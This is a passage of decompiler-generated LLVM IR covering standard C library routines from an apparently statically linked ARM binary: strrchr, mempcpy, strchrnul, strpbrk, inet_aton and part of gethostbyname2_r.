  %v0_17404 = phi i32 [ %v1_17404, %dec_label_pc_17404 ], [ 0, %entry ]
  %v0_173e810 = phi i32 [ %v3_1740c, %dec_label_pc_17404 ], [ %v3_1740c5, %entry ]
  br label %dec_label_pc_173f0

dec_label_pc_1741c:                               ; preds = %dec_label_pc_17404, %dec_label_pc_173f0, %entry
  %v0_1741c = phi i32 [ 0, %entry ], [ %v0_17404, %dec_label_pc_173f0 ], [ %v1_17404, %dec_label_pc_17404 ]
  ret i32 %v0_1741c

; uselistorder directives
  uselistorder i32 %v0_173f8, { 1, 0 }
  uselistorder label %dec_label_pc_173f0.preheader, { 1, 0 }
}

define i32 @__GI_strrchr(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1742c = urem i32 %arg2, 256
  store i32 %v1_1742c, i32* @r4, align 4
  %v2_1742c = icmp eq i32 %v1_1742c, 0
  br i1 %v2_1742c, label %dec_label_pc_17440, label %dec_label_pc_17454.preheader

dec_label_pc_17454.preheader:                     ; preds = %entry
  store i32 0, i32* @r5, align 4
  store i32 %arg1, i32* @r0, align 4
  %v2_1745c3 = call i32 @__GI_strchr(i32 %arg1, i32 %v1_1742c)
  %v2_174605 = icmp eq i32 %v2_1745c3, 0
  br i1 %v2_174605, label %dec_label_pc_17468, label %dec_label_pc_1744c

dec_label_pc_17440:                               ; preds = %entry
  %v2_17444 = call i32 @__GI_strchr(i32 %arg1, i32 0)
  br label %dec_label_pc_1746c

dec_label_pc_1744c:                               ; preds = %dec_label_pc_17454.preheader, %dec_label_pc_1744c
  %v2_1745c6 = phi i32 [ %v2_1745c, %dec_label_pc_1744c ], [ %v2_1745c3, %dec_label_pc_17454.preheader ]
  store i32 %v2_1745c6, i32* @r5, align 4
  %v1_17450 = add i32 %v2_1745c6, 1
  store i32 %v1_17450, i32* @r0, align 4
  %v0_17458 = load i32, i32* @r4, align 4
  %v2_1745c = call i32 @__GI_strchr(i32 %v1_17450, i32 %v0_17458)
  %v2_17460 = icmp eq i32 %v2_1745c, 0
  br i1 %v2_17460, label %dec_label_pc_17468, label %dec_label_pc_1744c

dec_label_pc_17468:                               ; preds = %dec_label_pc_1744c, %dec_label_pc_17454.preheader
  %v0_17468 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1746c

dec_label_pc_1746c:                               ; preds = %dec_label_pc_17440, %dec_label_pc_17468
  %storemerge = phi i32 [ %v2_17444, %dec_label_pc_17440 ], [ %v0_17468, %dec_label_pc_17468 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_1745c, { 1, 0 }
  uselistorder i32 %v1_17450, { 1, 0 }
  uselistorder i32 %v1_1742c, { 2, 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1746c, { 1, 0 }
  uselistorder label %dec_label_pc_1744c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v6_17478 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17488 = call i32 @memcpy()
  %v0_1748c = load i32, i32* @r5, align 4
  %v1_1748c = load i32, i32* @r4, align 4
  %v2_1748c = add i32 %v1_1748c, %v0_1748c
  store i32 %v6_17478, i32* @r5, align 4
  ret i32 %v2_1748c
}

define i32 @__GI_strchrnul(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_174a0 = urem i32 %arg1, 256
  %v0_174c02 = load i32, i32* @r0, align 4
  %v1_174c03 = urem i32 %v0_174c02, 4
  %v2_174c04 = icmp eq i32 %v1_174c03, 0
  br i1 %v2_174c04, label %dec_label_pc_174c8, label %dec_label_pc_174a8

dec_label_pc_174a8:                               ; preds = %entry, %dec_label_pc_174bc
  %v0_174bc = phi i32 [ %v1_174bc, %dec_label_pc_174bc ], [ %v0_174c02, %entry ]
  %v1_174a8 = inttoptr i32 %v0_174bc to i8*
  %v2_174a8 = load i8, i8* %v1_174a8, align 1
  %v3_174a8 = zext i8 %v2_174a8 to i32
  %v9_174ac = icmp eq i32 %v3_174a8, %v1_174a0
  br i1 %v9_174ac, label %dec_label_pc_17578, label %dec_label_pc_174b4

dec_label_pc_174b4:                               ; preds = %dec_label_pc_174a8
  %v2_174b4 = icmp eq i8 %v2_174a8, 0
  br i1 %v2_174b4, label %dec_label_pc_17578, label %dec_label_pc_174bc

dec_label_pc_174bc:                               ; preds = %dec_label_pc_174b4
  %v1_174bc = add i32 %v0_174bc, 1
  %v1_174c0 = urem i32 %v1_174bc, 4
  %v2_174c0 = icmp eq i32 %v1_174c0, 0
  br i1 %v2_174c0, label %dec_label_pc_174c8, label %dec_label_pc_174a8

dec_label_pc_174c8:                               ; preds = %dec_label_pc_174bc, %entry
  %v0_174cc = phi i32 [ %v0_174c02, %entry ], [ %v1_174bc, %dec_label_pc_174bc ]
  %v4_174c8 = mul nuw nsw i32 %v1_174a0, 256
  %v5_174c8 = or i32 %v4_174c8, %v1_174a0
  %v4_174d0 = mul i32 %v5_174c8, 65536
  %v5_174d0 = or i32 %v4_174d0, %v5_174c8
  br label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_17570, %dec_label_pc_17510, %dec_label_pc_174c8
  %v0_17538 = phi i32 [ %v0_174cc, %dec_label_pc_174c8 ], [ %v4_174d4, %dec_label_pc_17510 ], [ %v4_174d4, %dec_label_pc_17570 ]
  %v1_174d4 = inttoptr i32 %v0_17538 to i32*
  %v2_174d4 = load i32, i32* %v1_174d4, align 4
  %v4_174d4 = add i32 %v0_17538, 4
  %v2_174dc = xor i32 %v2_174d4, %v5_174d0
  %v2_174e0 = add i32 %v2_174dc, 2130640639
  store i32 %v2_174e0, i32* @ip, align 4
  %v2_174e8 = add i32 %v2_174d4, 2130640639
  %v1_174ec = sub i32 -1, %v2_174d4
  %v2_174f0 = xor i32 %v2_174e8, %v1_174ec
  %v2_174fc = and i32 %v2_174f0, -2130640640
  %v2_17504 = icmp eq i32 %v2_174fc, 0
  br i1 %v2_17504, label %dec_label_pc_17510, label %dec_label_pc_17518

dec_label_pc_17510:                               ; preds = %dec_label_pc_174d4
  %v1_174f8 = sub i32 -1, %v2_174dc
  %v2_17500 = xor i32 %v2_174e0, %v1_174f8
  %v2_17508 = and i32 %v2_17500, -2130640640
  %v2_17510 = icmp eq i32 %v2_17508, 0
  br i1 %v2_17510, label %dec_label_pc_174d4, label %dec_label_pc_17518

dec_label_pc_17518:                               ; preds = %dec_label_pc_174d4, %dec_label_pc_17510
  %v2_17518 = inttoptr i32 %v0_17538 to i8*
  %v3_17518 = load i8, i8* %v2_17518, align 1
  %v4_17518 = zext i8 %v3_17518 to i32
  %v9_1751c = icmp eq i32 %v4_17518, %v1_174a0
  br i1 %v9_1751c, label %dec_label_pc_17578, label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %dec_label_pc_17518
  %v2_17528 = icmp eq i8 %v3_17518, 0
  br i1 %v2_17528, label %dec_label_pc_17578, label %dec_label_pc_17530

dec_label_pc_17530:                               ; preds = %dec_label_pc_17528
  %v1_17530 = add i32 %v0_17538, 1
  %v2_17530 = inttoptr i32 %v1_17530 to i8*
  %v3_17530 = load i8, i8* %v2_17530, align 1
  %v4_17530 = zext i8 %v3_17530 to i32
  %v9_17534 = icmp eq i32 %v4_17530, %v1_174a0
  br i1 %v9_17534, label %dec_label_pc_17578, label %dec_label_pc_17540

dec_label_pc_17540:                               ; preds = %dec_label_pc_17530
  %v2_17540 = icmp eq i8 %v3_17530, 0
  br i1 %v2_17540, label %dec_label_pc_17578, label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %dec_label_pc_17540
  %v1_17548 = add i32 %v0_17538, 2
  %v2_17548 = inttoptr i32 %v1_17548 to i8*
  %v3_17548 = load i8, i8* %v2_17548, align 1
  %v4_17548 = zext i8 %v3_17548 to i32
  %v9_1754c = icmp eq i32 %v4_17548, %v1_174a0
  br i1 %v9_1754c, label %dec_label_pc_17578, label %dec_label_pc_17558

dec_label_pc_17558:                               ; preds = %dec_label_pc_17548
  %v2_17558 = icmp eq i8 %v3_17548, 0
  br i1 %v2_17558, label %dec_label_pc_17578, label %dec_label_pc_17560

dec_label_pc_17560:                               ; preds = %dec_label_pc_17558
  %v1_17560 = add i32 %v0_17538, 3
  %v2_17560 = inttoptr i32 %v1_17560 to i8*
  %v3_17560 = load i8, i8* %v2_17560, align 1
  %v4_17560 = zext i8 %v3_17560 to i32
  %v9_17564 = icmp eq i32 %v4_17560, %v1_174a0
  br i1 %v9_17564, label %dec_label_pc_17578, label %dec_label_pc_17570

dec_label_pc_17570:                               ; preds = %dec_label_pc_17560
  %v2_17570 = icmp eq i8 %v3_17560, 0
  br i1 %v2_17570, label %dec_label_pc_17578, label %dec_label_pc_174d4

dec_label_pc_17578:                               ; preds = %dec_label_pc_174b4, %dec_label_pc_174a8, %dec_label_pc_17570, %dec_label_pc_17560, %dec_label_pc_17558, %dec_label_pc_17548, %dec_label_pc_17540, %dec_label_pc_17530, %dec_label_pc_17528, %dec_label_pc_17518
  %v1_1757c = phi i32 [ %v1_17560, %dec_label_pc_17570 ], [ %v1_17560, %dec_label_pc_17560 ], [ %v1_17548, %dec_label_pc_17558 ], [ %v1_17548, %dec_label_pc_17548 ], [ %v1_17530, %dec_label_pc_17540 ], [ %v1_17530, %dec_label_pc_17530 ], [ %v0_17538, %dec_label_pc_17528 ], [ %v0_17538, %dec_label_pc_17518 ], [ %v0_174bc, %dec_label_pc_174a8 ], [ %v0_174bc, %dec_label_pc_174b4 ]
  ret i32 %v1_1757c

; uselistorder directives
  uselistorder i32 %v4_174d4, { 1, 0 }
  uselistorder i32 %v2_174d4, { 0, 2, 1 }
  uselistorder i32 %v0_17538, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v5_174c8, { 1, 0 }
  uselistorder i32 %v1_174bc, { 1, 0, 2 }
  uselistorder i32 %v0_174c02, { 2, 1, 0 }
  uselistorder i32 %v1_174a0, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 -2130640640, { 0, 1, 2, 6, 3, 4, 5 }
  uselistorder i32 2130640639, { 2, 6, 7, 3, 0, 8, 9, 4, 1, 5, 10 }
  uselistorder label %dec_label_pc_17578, { 2, 3, 4, 5, 6, 7, 8, 9, 0, 1 }
  uselistorder label %dec_label_pc_17518, { 1, 0 }
  uselistorder label %dec_label_pc_174a8, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_175b4

dec_label_pc_17590:                               ; preds = %dec_label_pc_175a0
  %v3_175a0 = zext i8 %v2_175a0 to i32
  %v1_175a8 = add i32 %v0_175a8, 1
  %v1_17590 = load i32, i32* %r0.global-to-local, align 4
  %v9_17590 = icmp eq i32 %v3_175a0, %v1_17590
  br i1 %v9_17590, label %dec_label_pc_17598, label %dec_label_pc_175a0

dec_label_pc_17598:                               ; preds = %dec_label_pc_17590
  %v0_17598 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_17598, i32* %r0.global-to-local, align 4
  ret i32 %v0_17598

dec_label_pc_175a0:                               ; preds = %dec_label_pc_17590, %dec_label_pc_175b4
  %v0_175a8 = phi i32 [ %v1_175a8, %dec_label_pc_17590 ], [ %arg2, %dec_label_pc_175b4 ]
  %v1_175a0 = inttoptr i32 %v0_175a8 to i8*
  %v2_175a0 = load i8, i8* %v1_175a0, align 1
  %v2_175a4 = icmp eq i8 %v2_175a0, 0
  br i1 %v2_175a4, label %dec_label_pc_175b0, label %dec_label_pc_17590

dec_label_pc_175b0:                               ; preds = %dec_label_pc_175a0
  %v0_175b0 = load i32, i32* %r2.global-to-local, align 4
  %v1_175b0 = add i32 %v0_175b0, 1
  br label %dec_label_pc_175b4

dec_label_pc_175b4:                               ; preds = %entry, %dec_label_pc_175b0
  %storemerge = phi i32 [ %tmp, %entry ], [ %v1_175b0, %dec_label_pc_175b0 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_175b4 = inttoptr i32 %storemerge to i8*
  %v2_175b4 = load i8, i8* %v1_175b4, align 1
  %v3_175b4 = zext i8 %v2_175b4 to i32
  store i32 %v3_175b4, i32* %r0.global-to-local, align 4
  %v2_175b8 = icmp eq i8 %v2_175b4, 0
  %v0_175bc = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_175b8, i32 %v0_175bc)
  br label %dec_label_pc_175a0

; uselistorder directives
  uselistorder i32 %v0_175a8, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_175b4, { 1, 0 }
  uselistorder label %dec_label_pc_175a0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_175c8 = load i32, i32* @r4, align 4
  store i32 %v3_175c8, i32* %stack_var_-28, align 4
  %v0_175d0 = load i32, i32* %r0.global-to-local, align 4
  %v2_175d0 = icmp eq i32 %v0_175d0, 0
  br i1 %v2_175d0, label %dec_label_pc_176ac, label %dec_label_pc_175e0

dec_label_pc_175e0:                               ; preds = %entry
  br label %dec_label_pc_175f8

dec_label_pc_175f8:                               ; preds = %dec_label_pc_175e0, %dec_label_pc_17670
  %v1_17670 = phi i32 [ 0, %dec_label_pc_175e0 ], [ %v5_17670, %dec_label_pc_17670 ]
  %v0_17674 = phi i32 [ 1, %dec_label_pc_175e0 ], [ %v1_17674, %dec_label_pc_17670 ]
  %v0_175f8 = phi i32 [ %v0_175d0, %dec_label_pc_175e0 ], [ %v0_175f812, %dec_label_pc_17670 ]
  %v1_175f8 = inttoptr i32 %v0_175f8 to i8*
  %v2_175f8 = load i8, i8* %v1_175f8, align 1
  %v3_175f8 = zext i8 %v2_175f8 to i32
  %v4_175fc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_26934.581 to i32), i32 1824) to i32*), align 4
  %v2_17600 = mul nuw nsw i32 %v3_175f8, 2
  %v2_17604 = add i32 %v2_17600, %v4_175fc
  %v3_17604 = inttoptr i32 %v2_17604 to i16*
  %v4_17604 = load i16, i16* %v3_17604, align 2
  %v1_17608 = and i16 %v4_17604, 8
  %v2_17608 = icmp eq i16 %v1_17608, 0
  br i1 %v2_17608, label %dec_label_pc_176ac, label %dec_label_pc_17610

dec_label_pc_17610:                               ; preds = %dec_label_pc_175f8
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_17630

dec_label_pc_17618:                               ; preds = %dec_label_pc_17630
  %v2_17618 = mul i32 %v0_17670, 10
  %v1_1761c = add i32 %v2_17618, -48
  %v2_17620 = add i32 %v3_17630, %v1_1761c
  store i32 %v2_17620, i32* @ip, align 4
  %v8_17628 = icmp sgt i32 %v2_17620, 255
  br i1 %v8_17628, label %dec_label_pc_176ac, label %dec_label_pc_1762c

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17618
  %v1_1762c = add i32 %v0_17660, 1
  store i32 %v1_1762c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17630

dec_label_pc_17630:                               ; preds = %dec_label_pc_17610, %dec_label_pc_1762c
  %v0_17670 = phi i32 [ 0, %dec_label_pc_17610 ], [ %v2_17620, %dec_label_pc_1762c ]
  %v0_17660 = phi i32 [ %v0_175f8, %dec_label_pc_17610 ], [ %v1_1762c, %dec_label_pc_1762c ]
  %v1_17630 = inttoptr i32 %v0_17660 to i8*
  %v2_17630 = load i8, i8* %v1_17630, align 1
  %v3_17630 = zext i8 %v2_17630 to i32
  %v2_17634 = mul nuw nsw i32 %v3_17630, 2
  %v2_17638 = add i32 %v2_17634, %v4_175fc
  %v3_17638 = inttoptr i32 %v2_17638 to i16*
  %v4_17638 = load i16, i16* %v3_17638, align 2
  %v6_17638 = zext i16 %v4_17638 to i32
  %v1_1763c = and i32 %v6_17638, 8
  %v2_1763c = icmp eq i32 %v1_1763c, 0
  br i1 %v2_1763c, label %dec_label_pc_17644, label %dec_label_pc_17618

dec_label_pc_17644:                               ; preds = %dec_label_pc_17630
  %v7_17644 = icmp eq i32 %v0_17674, 4
  br i1 %v7_17644, label %dec_label_pc_1765c, label %dec_label_pc_1764c

dec_label_pc_1764c:                               ; preds = %dec_label_pc_17644
  %v7_1764c = icmp eq i8 %v2_17630, 46
  br i1 %v7_1764c, label %dec_label_pc_17654, label %dec_label_pc_176ac

dec_label_pc_17654:                               ; preds = %dec_label_pc_1764c
  %v1_17654 = add i32 %v0_17660, 1
  store i32 %v1_17654, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17670

dec_label_pc_1765c:                               ; preds = %dec_label_pc_17644
  %v2_1765c = icmp eq i8 %v2_17630, 0
  %v1_17660 = add i32 %v0_17660, 1
  store i32 %v1_17660, i32* %r0.global-to-local, align 4
  br i1 %v2_1765c, label %dec_label_pc_17670, label %dec_label_pc_17668

dec_label_pc_17668:                               ; preds = %dec_label_pc_1765c
  %v1_17668 = and i32 %v6_17638, 32
  %v2_17668 = icmp eq i32 %v1_17668, 0
  br i1 %v2_17668, label %dec_label_pc_176ac, label %dec_label_pc_17670

dec_label_pc_17670:                               ; preds = %dec_label_pc_17668, %dec_label_pc_1765c, %dec_label_pc_17654
  %v0_175f812 = phi i32 [ %v1_17660, %dec_label_pc_17668 ], [ %v1_17660, %dec_label_pc_1765c ], [ %v1_17654, %dec_label_pc_17654 ]
  %v4_17670 = mul i32 %v1_17670, 256
  %v5_17670 = or i32 %v0_17670, %v4_17670
  %v1_17674 = add nuw nsw i32 %v0_17674, 1
  %v7_1767c = icmp slt i32 %v1_17674, 5
  br i1 %v7_1767c, label %dec_label_pc_175f8, label %dec_label_pc_17680

dec_label_pc_17680:                               ; preds = %dec_label_pc_17670
  %v2_17680 = icmp eq i32 %arg2, 0
  br i1 %v2_17680, label %.thread7.thread, label %bb

.thread7.thread:                                  ; preds = %dec_label_pc_17680
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_176b0

bb:                                               ; preds = %dec_label_pc_17680
  %v4_17684 = udiv i32 %v5_17670, 16777216
  %v2_17688 = udiv i32 %v5_17670, 256
  %v5_1768c = and i32 %v2_17688, 65280
  %v2_17690 = and i32 %v5_17670, 65280
  %v5_17694 = mul nuw nsw i32 %v2_17690, 256
  %v5_17698 = mul i32 %v0_17670, 16777216
  %v6_1768c = or i32 %v4_17684, %v5_17698
  %v6_17694 = or i32 %v6_1768c, %v5_1768c
  %v6_17698 = or i32 %v6_17694, %v5_17694
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_176a4 = inttoptr i32 %arg2 to i32*
  store i32 %v6_17698, i32* %v3_176a4, align 4
  %v2_176b0.pre = load i32, i32* %stack_var_-28, align 4
  %v1_176b4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_176b0

dec_label_pc_176ac:                               ; preds = %dec_label_pc_1764c, %dec_label_pc_17668, %dec_label_pc_175f8, %dec_label_pc_17618, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_176b0

dec_label_pc_176b0:                               ; preds = %.thread7.thread, %bb, %dec_label_pc_176ac
  %v1_176b4 = phi i32 [ %v1_176b4.pre, %bb ], [ 0, %dec_label_pc_176ac ], [ 1, %.thread7.thread ]
  %v2_176b0 = phi i32 [ %v2_176b0.pre, %bb ], [ %v3_175c8, %dec_label_pc_176ac ], [ %v3_175c8, %.thread7.thread ]
  store i32 %v2_176b0, i32* @r4, align 4
  ret i32 %v1_176b4

; uselistorder directives
  uselistorder i32 %v1_17674, { 1, 0 }
  uselistorder i32 %v5_17670, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17660, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 5, 3, 4, 2, 6, 7, 8, 0, 1 }
  uselistorder i32 65280, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_176b0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_176ac, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17630, { 1, 0 }
  uselistorder label %dec_label_pc_175f8, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r0, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v9_176c0 = load i32, i32* @r6, align 4
  %v12_176c0 = load i32, i32* @r7, align 4
  %v15_176c0 = load i32, i32* @r8, align 4
  %v18_176c0 = load i32, i32* @sb, align 4
  %v21_176c0 = load i32, i32* @sl, align 4
  %v7_176c4 = icmp eq i32 %arg2, 2
  store i32 %arg2, i32* @r4, align 4
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg4, i32* @r8, align 4
  store i32 %arg1, i32* @sb, align 4
  store i32 %arg5, i32* @sl, align 4
  store i32 %arg7, i32* @fp, align 4
  br i1 %v7_176c4, label %dec_label_pc_176e8, label %dec_label_pc_17708

dec_label_pc_176e8:                               ; preds = %entry
  store i32 %arg6, i32* @ip, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg4, i32* @r2, align 4
  store i32 %arg5, i32* @r3, align 4
  %v0_17700 = call i32 @gethostbyname_r()
  store i32 %v0_17700, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17954

dec_label_pc_17708:                               ; preds = %entry
  store i32 %arg6, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v7_17710 = icmp eq i32 %arg2, 10
  %v2_17714 = inttoptr i32 %arg6 to i32*
  store i32 0, i32* %v2_17714, align 4
  br i1 %v7_17710, label %dec_label_pc_1771c, label %dec_label_pc_17950

dec_label_pc_1771c:                               ; preds = %dec_label_pc_17708
  %v1_1771c = load i32, i32* @r7, align 4
  %v9_1771c = icmp eq i32 %v1_1771c, %arg1
  br i1 %v9_1771c, label %dec_label_pc_17950, label %dec_label_pc_17724

dec_label_pc_17724:                               ; preds = %dec_label_pc_1771c
  %v0_17724 = call i32 @__GI___errno_location()
  store i32 %v0_17724, i32* %r0.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_17724, i32* @r5, align 4
  %v0_17730 = load i32, i32* @r4, align 4
  %v0_17734 = load i32, i32* @r6, align 4
  store i32 %v0_17734, i32* %r2.global-to-local, align 4
  %v1_17738 = inttoptr i32 %v0_17724 to i32*
  %v2_17738 = load i32, i32* %v1_17738, align 4
  store i32 %v2_17738, i32* @r4, align 4
  %v0_1773c = load i32, i32* @r8, align 4
  store i32 %v0_1773c, i32* %r3.global-to-local, align 4
  %v0_17740 = load i32, i32* @r7, align 4
  store i32 %v0_17740, i32* %v1_17738, align 4
  %v0_17744 = load i32, i32* @sb, align 4
  store i32 %v0_17744, i32* %r0.global-to-local, align 4
  %v2_17748 = load i32, i32* @sl, align 4
  %v5_17748 = load i32, i32* %ip.global-to-local, align 4
  %v0_1774c = load i32, i32* @fp, align 4
  %v7_17750 = call i32 @__get_hosts_byname_r(i32 %v0_17744, i32 %v0_17730, i32 %v0_17734, i32 %v0_1773c, i32 %v2_17748, i32 %v5_17748, i32 %v0_1774c)
  store i32 %v7_17750, i32* %r0.global-to-local, align 4
  %v2_17754 = icmp eq i32 %v7_17750, 0
  br i1 %v2_17754, label %bb, label %dec_label_pc_17760

bb:                                               ; preds = %dec_label_pc_17724
  %v1_17758 = load i32, i32* @r4, align 4
  %v2_17758 = load i32, i32* @r5, align 4
  %v3_17758 = inttoptr i32 %v2_17758 to i32*
  store i32 %v1_17758, i32* %v3_17758, align 4
  br label %dec_label_pc_17954

dec_label_pc_17760:                               ; preds = %dec_label_pc_17724
  %v0_17760 = load i32, i32* @fp, align 4
  %v1_17760 = inttoptr i32 %v0_17760 to i32*
  %v2_17760 = load i32, i32* %v1_17760, align 4
  store i32 %v2_17760, i32* %r3.global-to-local, align 4
  %v7_17764 = icmp eq i32 %v2_17760, 1
  br i1 %v7_17764, label %dec_label_pc_17780, label %dec_label_pc_1776c

dec_label_pc_1776c:                               ; preds = %dec_label_pc_17760
  %v7_1776c = icmp eq i32 %v2_17760, 4
  br i1 %v7_1776c, label %dec_label_pc_1779c, label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %dec_label_pc_1776c
  %v3_17774 = icmp eq i32 %v2_17760, -1
  br i1 %v3_17774, label %dec_label_pc_17790, label %dec_label_pc_17954

dec_label_pc_17780:                               ; preds = %dec_label_pc_17760
  %v7_17780 = icmp eq i32 %v7_17750, 2
  br i1 %v7_17780, label %.thread1, label %bb29

bb29:                                             ; preds = %dec_label_pc_17780
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_177a0

.thread1:                                         ; preds = %dec_label_pc_17780
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_177a0

dec_label_pc_17790:                               ; preds = %dec_label_pc_17774
  %v0_17790 = load i32, i32* @r5, align 4
  %v1_17790 = inttoptr i32 %v0_17790 to i32*
  %v2_17790 = load i32, i32* %v1_17790, align 4
  store i32 %v2_17790, i32* %r3.global-to-local, align 4
  %v7_17794 = icmp eq i32 %v2_17790, 2
  br i1 %v7_17794, label %dec_label_pc_1779c, label %dec_label_pc_17954

dec_label_pc_1779c:                               ; preds = %dec_label_pc_17790, %dec_label_pc_1776c
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_177a0

dec_label_pc_177a0:                               ; preds = %bb29, %.thread1, %dec_label_pc_1779c
  %v0_177a0 = load i32, i32* @r8, align 4
  %v1_177a0 = sub i32 0, %v0_177a0
  %v1_177a4 = urem i32 %v1_177a0, 4
  store i32 %v1_177a4, i32* %r0.global-to-local, align 4
  %v1_177a8 = load i32, i32* @sl, align 4
  %v2_177a8 = sub i32 %v1_177a8, %v1_177a4
  %v1_177ac = add i32 %v2_177a8, -24
  store i32 %v1_177ac, i32* @sl, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_177b8 = load i32, i32* @r4, align 4
  %v1_177b8 = load i32, i32* @r5, align 4
  %v2_177b8 = inttoptr i32 %v1_177b8 to i32*
  store i32 %v0_177b8, i32* %v2_177b8, align 4
  %v7_177bc = icmp sgt i32 %v1_177ac, 255
  br i1 %v7_177bc, label %dec_label_pc_177c8, label %bb30

bb30:                                             ; preds = %dec_label_pc_177a0
  store i32 34, i32* %r0.global-to-local, align 4
  %v0_177c0 = load i32, i32* %r3.global-to-local, align 4
  %v1_177c0 = load i32, i32* @fp, align 4
  %v2_177c0 = inttoptr i32 %v1_177c0 to i32*
  store i32 %v0_177c0, i32* %v2_177c0, align 4
  br label %dec_label_pc_17954

dec_label_pc_177c8:                               ; preds = %dec_label_pc_177a0
  %v0_177c03 = load i32, i32* %r3.global-to-local, align 4
  %v1_177c04 = load i32, i32* @fp, align 4
  %v2_177c05 = inttoptr i32 %v1_177c04 to i32*
  store i32 %v0_177c03, i32* %v2_177c05, align 4
  %v0_177c8 = load i32, i32* @r8, align 4
  %v1_177c8 = load i32, i32* %r0.global-to-local, align 4
  %v2_177c8 = add i32 %v1_177c8, %v0_177c8
  store i32 %v2_177c8, i32* @r8, align 4
  store i32 0, i32* @r4, align 4
  %v1_177d0 = add i32 %v2_177c8, 16
  store i32 %v1_177d0, i32* %r2.global-to-local, align 4
  %v1_177d4 = add i32 %v2_177c8, 24
  store i32 %v1_177d4, i32* @r5, align 4
  %v3_177dc = inttoptr i32 %v1_177d0 to i32*
  store i32 %v2_177c8, i32* %v3_177dc, align 4
  %v0_177e0 = load i32, i32* @sb, align 4
  store i32 %v0_177e0, i32* @r1, align 4
  %v0_177e4 = load i32, i32* @r4, align 4
  %v1_177e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_177e4 = add i32 %v1_177e4, 4
  %v3_177e4 = inttoptr i32 %v2_177e4 to i32*
  store i32 %v0_177e4, i32* %v3_177e4, align 4
  %v0_177e8 = load i32, i32* @r5, align 4
  store i32 %v0_177e8, i32* %r0.global-to-local, align 4
  %v0_177ec = load i32, i32* @sl, align 4
  store i32 %v0_177ec, i32* %r2.global-to-local, align 4
  %v3_177f0 = call i32 @strncpy(i32 %v0_177e8, i32 %v0_177e0, i32 %v0_177ec)
  %v0_177f4 = load i32, i32* @r4, align 4
  %v1_177f4 = trunc i32 %v0_177f4 to i8
  %v2_177f4 = load i32, i32* @r5, align 4
  %v3_177f4 = load i32, i32* @sl, align 4
  %v4_177f4 = add i32 %v3_177f4, %v2_177f4
  %v5_177f4 = inttoptr i32 %v4_177f4 to i8*
  store i8 %v1_177f4, i8* %v5_177f4, align 1
